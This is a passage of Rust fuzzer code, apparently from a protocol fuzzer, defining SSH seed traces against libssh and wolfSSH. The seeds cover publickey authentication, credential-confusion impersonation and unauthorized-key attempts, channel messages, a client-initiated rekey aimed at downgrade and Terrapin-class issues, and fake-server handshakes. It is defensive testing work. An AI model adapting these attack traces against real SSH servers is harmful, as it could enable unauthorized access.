/// (user "userb", key B), which the harness allow-list authorizes. Mirrors the
/// key-A publickey seed but with B's username / blob / signature, so it completes
/// the handshake. This is the starting point the fuzzer mutates toward cross-
/// identity attacks (swap B's username/blob/signature for A's or C's).
/// AES-256-GCM, c2s counters: SERVICE_REQUEST 0, USERAUTH_REQUEST 1, channel 2,3.
pub fn seed_client_attacker_pubkey_b(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    // B signs over (session id, "userb", service, key-B blob) with B's key.
    let sig = term! {
        fn_sign_userauth_b((@exch_hash), (fn_username_b), (fn_ssh_connection), (fn_client_b_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username_b), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_b_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_1))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_2))
    };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((fn_u32_0), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_ssh_userauth))))),
            (@key), (@iv), (fn_u32_3))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

/// Credential-confusion **impersonation** seed: present user **A**'s name ("user")
/// but key **B**, with a cryptographically VALID signature by key B over that very
/// request. The stack's signature check passes (B really signed it), so the only
/// thing standing between the attacker and a session is the (user, key) binding:
/// (user "user", key B) is NOT in the allow-list, so a correct server rejects.
/// A stack that authenticates here — or a cross-vendor accept/reject disagreement —
/// is an impersonation finding. This is the headline credential-confusion case.
pub fn seed_client_attacker_impersonate_a_with_b(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    // Valid signature by key B, but over a request whose username is "user" (A's
    // name). Signature verifies; the (user "user", key B) pairing is unauthorized.
    let sig = term! {
        fn_sign_userauth_b((@exch_hash), (fn_username), (fn_ssh_connection), (fn_client_b_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_b_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_1))
    };
    // After a REJECTED auth, pump with SSH_MSG_IGNORE (permitted in any state) so
    // wolfSSH flushes its USERAUTH_FAILURE without hitting "message not allowed
    // before user authentication" (which a channel message would trigger). This
    // keeps the seed differential-clean: both stacks reject identically, so the
    // un-mutated trace is 0-diff and mutations that make one stack ACCEPT the bad
    // pairing surface as a real accept/reject divergence.
    let pump1 = term! {
        fn_encrypt_packet_aesgcm((fn_ignore((fn_ssh_bytes_empty))), (@key), (@iv), (fn_u32_2))
    };
    let pump2 = term! {
        fn_encrypt_packet_aesgcm((fn_ignore((fn_ssh_bytes_empty))), (@key), (@iv), (fn_u32_3))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @pump1 }),
            InputAction::new_step(server, term! { @pump2 }),
        ],
        ..Default::default()
    }
}

/// Credential-confusion **unauthorized-key** seed: authenticate as identity **C**
/// (user "userc", key C) with a valid signature by key C. Key C is deliberately
/// absent from the allow-list, so a correct server rejects despite the valid
/// signature. A stack that accepts — or a cross-vendor disagreement — is a finding.
pub fn seed_client_attacker_unauthorized_key_c(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let sig = term! {
        fn_sign_userauth_c((@exch_hash), (fn_username_c), (fn_ssh_connection), (fn_client_c_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username_c), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_c_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_1))
    };
    // Pump with SSH_MSG_IGNORE after the rejected auth (see impersonate seed).
    let pump1 = term! {
        fn_encrypt_packet_aesgcm((fn_ignore((fn_ssh_bytes_empty))), (@key), (@iv), (fn_u32_2))
    };
    let pump2 = term! {
        fn_encrypt_packet_aesgcm((fn_ignore((fn_ssh_bytes_empty))), (@key), (@iv), (fn_u32_3))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @pump1 }),
            InputAction::new_step(server, term! { @pump2 }),
        ],
        ..Default::default()
    }
}

/// Session-layer (RFC 4254 connection protocol) seed: authenticate by publickey
/// (key A, accepted), open a session channel, then drive the full set of channel
/// messages — WINDOW_ADJUST, DATA, EXTENDED_DATA, EOF, CLOSE. The other seeds stop
/// at channel-open / channel-request; this one exercises libssh's channel data /
/// flow-control / teardown handlers, a large code area no other seed reaches.
/// AES-256-GCM, c2s counter = packet index since NewKeys.
pub fn seed_client_attacker_channel_data(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let sig = term! {
        fn_sign_userauth((@exch_hash), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_1))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_2))
    };
    // Connection-protocol traffic on the (assumed channel 0) session.
    let win_adjust = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_window_adjust((fn_u32_0), (fn_u32_0x10000))), (@key), (@iv), (fn_u32_3))
    };
    // Mutable byte payload (fn_ssh_bytes over a Vec<u8> leaf): bit-level havoc
    // grows/shrinks/flips the bytes and the DY mutator can swap the leaf — the
    // entry point for fuzzing the peer's post-auth channel-data parser.
    let chan_data = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_data((fn_u32_0), (fn_ssh_bytes((fn_channel_payload))))),
            (@key), (@iv), (fn_u32_4))
    };
    let chan_ext_data = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_extended_data((fn_u32_0), (fn_u32_1), (fn_ssh_bytes((fn_channel_payload))))),
            (@key), (@iv), (fn_u32_5))
    };
    let chan_eof = term! {
        fn_encrypt_packet_aesgcm((fn_channel_eof((fn_u32_0))), (@key), (@iv), (fn_u32_6))
    };
    let chan_close = term! {
        fn_encrypt_packet_aesgcm((fn_channel_close((fn_u32_0))), (@key), (@iv), (fn_u32_7))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @win_adjust }),
            InputAction::new_step(server, term! { @chan_data }),
            InputAction::new_step(server, term! { @chan_ext_data }),
            InputAction::new_step(server, term! { @chan_eof }),
            InputAction::new_step(server, term! { @chan_close }),
        ],
        ..Default::default()
    }
}

/// Rekey seed: complete the first key exchange, then drive a **client-initiated
/// rekey** (RFC 4253 §9) by sending — encrypted under the first set of keys — a
/// second KEXINIT, a second ECDH_INIT (reusing our ephemeral), and a second
/// NEWKEYS. This exercises the server's re-KEX state machine while a session is
/// already established: KEXINIT dispatch mid-session, rekey entry, a second ECDH,
/// and the second NEWKEYS key switch — a large code path no handshake-only seed
/// reaches, and the area where strict-kex re-arming / Terrapin-class issues live.
/// We don't send post-rekey traffic (that would need the re-derived keys), so the
/// whole rekey handshake rides on the first keys, which is correct: KEXINIT2 /
/// ECDH_INIT2 / NEWKEYS2 are all sent under the old cipher (NEWKEYS2 is the last
/// packet before the switch). AES-256-GCM, c2s counter = packet index since the
/// first NewKeys.
pub fn seed_client_attacker_rekey(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    // libssh's packet filter only permits a rekey KEXINIT once the connection is
    // established, so authenticate first (publickey, key A; counters 0,1).
    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let sig = term! {
        fn_sign_userauth((@exch_hash), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_1))
    };

    // Rekey handshake, encrypted under the first keys (c2s counters 2,3,4). The
    // rekey KEXINIT is synthesized bottom-up from algorithm-name atoms (like
    // seed_client_attacker_full_kexinit_synth) so its name-lists are mutable
    // sub-terms: this exposes the server's *re-KEX* negotiation to downgrade /
    // strict-kex-rearm / Terrapin-class mutations mid-session, a code path a
    // fixed rekey KEXINIT cannot reach. The clean algorithm set matches the
    // first handshake so the rekey still completes on an un-mutated run.
    //
    // NOTE: sending post-rekey *traffic* (encrypted under the re-derived keys, to
    // prove the switch took) would require the server's SECOND KexEcdhReply — but
    // that is s2c-encrypted and only flushed when the server processes rekey_newkeys,
    // the same flush/decryption wall documented for the channel-number query. So
    // this seed drives the re-KEX handshake but stops at rekey_newkeys.
    let rekey_kexinit = term! {
        fn_encrypt_packet_aesgcm(
            (fn_kex_init(
                (fn_cookie_zeros),
                (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
                (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
                (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
                (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
                (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
                (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
                (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
                (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
            )),
            (@key), (@iv), (fn_u32_2))
    };
    let rekey_ecdh_init = term! {
        fn_encrypt_packet_aesgcm(
            (fn_kex_ecdh_init((fn_client_ecdh_pubkey))), (@key), (@iv), (fn_u32_3))
    };
    let rekey_newkeys = term! {
        fn_encrypt_packet_aesgcm((fn_new_keys), (@key), (@iv), (fn_u32_4))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @rekey_kexinit }),
            InputAction::new_step(server, term! { @rekey_ecdh_init }),
            InputAction::new_step(server, term! { @rekey_newkeys }),
        ],
        ..Default::default()
    }
}

/// ext-info seed (RFC 8308): the client KEXINIT advertises `ext-info-c`, so the
/// server accepts a client SSH_MSG_EXT_INFO. After NewKeys the client sends an
/// encrypted EXT_INFO (server-sig-algs) as its first packet — exercising the
/// server's EXT_INFO parser — then authenticates by publickey so the handshake
/// completes (proving the EXT_INFO was accepted, not rejected). AES-256-GCM,
/// c2s counters: EXT_INFO 0, SERVICE_REQUEST 1, USERAUTH_REQUEST 2.
pub fn seed_client_attacker_ext_info(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // KEXINIT offering curve25519-sha256 + the ext-info-c marker.
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            (fn_kex_algos((fn_namelist_2((fn_algo_curve25519_sha256), (fn_algo_ext_info_c))))),
            (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    // First post-NewKeys packet: EXT_INFO (RFC 8308 §2.4), counter 0.
    let ext_info = term! {
        fn_encrypt_packet_aesgcm(
            (fn_ext_info((fn_ext_name_server_sig_algs), (fn_ext_val_rsa_sha2))),
            (@key), (@iv), (fn_u32_0))
    };
    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_1))
    };
    let sig = term! {
        fn_sign_userauth((@exch_hash), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_2))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @ext_info }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: server attacker with full handshake ─────────────────────────────────
//
// The fuzzer acts as the SSH server; the client is a real libssh instance.
// We use our embedded RSA key to sign the exchange hash so libssh will accept
// the ECDH reply. Then we send encrypted server-to-client messages after NewKeys.

pub fn seed_server_attacker_full(client: AgentName) -> Trace<SshProtocolTypes> {
    // After OutputAction(client):
    //   (client, 0)[None]/RawSshMessage → client banner
    //   (client, 0)[None]/SshMessage    → client KexInit
    // After sending banner + kexinit, client sends KexEcdhInit:
    //   (client, 0)[None]/SshBytes      → client ephemeral pubkey Q_C

    let client_banner_raw = term! { (client, 0)[None]/RawSshMessage };
    let client_banner_id = term! { fn_banner_id((@client_banner_raw)) };
    let client_kexinit = term! { (client, 0)[None]/SshMessage };
    let q_c = term! { (client, 0)[None]/SshBytes };

    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((client, 0)[None]/KexAlgorithms),
            ((client, 0)[None]/SignatureSchemes),
            ((client, 0)[None]/EncryptionAlgorithms),
            ((client, 1)[None]/EncryptionAlgorithms),
            ((client, 0)[None]/MacAlgorithms),
            ((client, 1)[None]/MacAlgorithms),
            ((client, 0)[None]/CompressionAlgorithms),
            ((client, 1)[None]/CompressionAlgorithms)
        )
    };

    let shared = term! {
        fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@q_c))
    };

    let i_c = term! { fn_kexinit_payload((@client_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@our_kexinit)) };

    let exch_hash = term! {
        fn_kex_exchange_hash(
            (@client_banner_id),
            (fn_puffin_id),
            (@i_c),
            (@i_s),
            (fn_server_rsa_pubkey_bytes),
            (@q_c),
            (fn_client_ecdh_pubkey),
            (@shared)
        )
    };

    let sig = term! { fn_sign_exchange_hash((@exch_hash)) };

    let enc_key_s2c = term! {
        fn_derive_enc_key_s2c((@shared), (@exch_hash), (@exch_hash))
    };

    // Sequence numbers for the server attacker:
    // Attacker sends: banner (not counted), KexInit(0), KexEcdhReply(1), NewKeys(2)
    // First encrypted packets: ServiceAccept(3), UserAuthSuccess(4)
    let svc_accept = term! {
        fn_encrypt_packet(
            (fn_service_accept((fn_ssh_userauth))),
            (@enc_key_s2c),
            (fn_u32_3)
        )
    };
    let auth_success = term! {
        fn_encrypt_packet(
            (fn_user_auth_success),
            (@enc_key_s2c),
            (fn_u32_4)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            client,
            SshDescriptorConfig {
                typ: AgentType::Client,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(client),
            InputAction::new_step(client, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(client, term! { fn_packet((@our_kexinit)) }),
            // After sending kexinit, client emits KexEcdhInit (captured as q_c above)
            InputAction::new_step(
                client,
                term! {
                    fn_packet((fn_kex_ecdh_reply(
                        (fn_server_rsa_pubkey),
                        (fn_client_ecdh_pubkey),
                        (fn_ssh_signature(
                            (fn_algo_rsa_sha2_256),
                            (@sig)
                        ))
                    )))
                },
            ),
            InputAction::new_step(client, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(client, term! { @svc_accept }),
            InputAction::new_step(client, term! { @auth_success }),
        ],
        ..Default::default()
    }
}

// ── Seed: server attacker full handshake over AES-256-GCM ─────────────────────
//
// Fuzzer is the SERVER; the libssh/wolfSSH client is the PUT. Forces
// aes256-gcm@openssh.com and offers only rsa-sha2-256 as the host-key algorithm
// (so the negotiated algorithm matches the rsa-sha2-256 signature). Completes
// the full handshake + encrypted server responses against BOTH implementations.
pub fn seed_server_attacker_full_aesgcm(client: AgentName) -> Trace<SshProtocolTypes> {
    let client_banner_id = term! { fn_banner_id(((client, 0)[None]/RawSshMessage)) };
    let client_kexinit = term! { (client, 0)[None]/SshMessage };
    let q_c = term! { (client, 0)[None]/SshBytes };

    // Fixed server KexInit (aes256-gcm, rsa-sha2-256 host key).
    let our_kexinit = term! { fn_server_kexinit_aesgcm((fn_placeholder_16bytes)) };

    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@q_c)) };
    let i_c = term! { fn_kexinit_payload((@client_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@our_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (@client_banner_id), (fn_puffin_id), (@i_c), (@i_s),
            (fn_server_rsa_pubkey_bytes), (@q_c), (fn_client_ecdh_pubkey), (@shared)
        )
    };
    let sig = term! { fn_sign_exchange_hash((@exch_hash)) };
    // s2c AES-256-GCM key + IV (direction the server encrypts towards the client).
    let key = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (@exch_hash)) };

    let svc_accept = term! {
        fn_encrypt_packet_aesgcm((fn_service_accept((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let auth_success = term! {
        fn_encrypt_packet_aesgcm((fn_user_auth_success), (@key), (@iv), (fn_u32_1))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            client,
            SshDescriptorConfig {
                typ: AgentType::Client,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(client),
            InputAction::new_step(client, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(client, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                client,
                term! {
                    fn_packet((fn_kex_ecdh_reply(
                        (fn_server_rsa_pubkey),
                        (fn_client_ecdh_pubkey),
                        (fn_ssh_signature((fn_algo_rsa_sha2_256), (@sig)))
                    )))
                },
            ),
            InputAction::new_step(client, term! { fn_packet((fn_new_keys)) }),
